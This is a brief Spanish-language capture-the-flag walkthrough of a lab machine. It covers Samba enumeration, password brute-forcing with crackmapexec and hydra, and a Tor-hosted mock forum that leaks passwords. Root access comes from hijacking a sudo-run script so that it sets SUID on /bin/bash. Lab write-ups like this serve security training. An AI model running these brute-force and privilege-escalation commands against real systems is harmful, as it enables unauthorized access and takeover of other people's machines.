## Reconocimiento:

ttl = 64 

Samba ( 139, 445 ), ssh ( 22 ) y sin http

```bash
enum4linux -a IP 
```

usuarios = dark y nobody y un compartido con permisos de lectura: darkshare

Fuerza bruta  a dark = 123456

```bash
$ crackmapexec smb IP -u USER -p DICT --shares
```

Interesa el archivo ilegal.txt con un mensaje cifrado en Cesar con una pista : “use 5”. Revelando un dominio con extensión TOR (.onion)

```bash
$ sudo apt install torbrowser-launcher
O desde la página : torproject.org
$ tar -xf tor-browser-linux-x86_64-14.0.3.tar.xz
$ cd tor-browser/
$ chmod +x start-tor-browser
$ ./start-tor-browser
```

Access the Dark Web  > Dark Forum > redroom27

En el código muestra el input “user” para mostrar usuario: “dark” 

Dark Forum > Hidden Marketplace 

Un boton de compra revela un txt con contraseñas

```bash
$ hydra -l dark -P diccionario.txt ssh://IP -t 64 -I
```

ssh con ‘ oniondarkgood ’

## Escalada:

Sudo -l e interesa /home/dark/hidden.py

Ejecuta el comandoque esté en un script : [Update.sh](http://Update.sh) 

```bash
$ rm Update.sh
$ nano Update.sh
#Dentro 
#!/bin/bash
chmod u+s /bin/bash
```

```bash
sudo /home/dark/hidden.py

bash -p
```
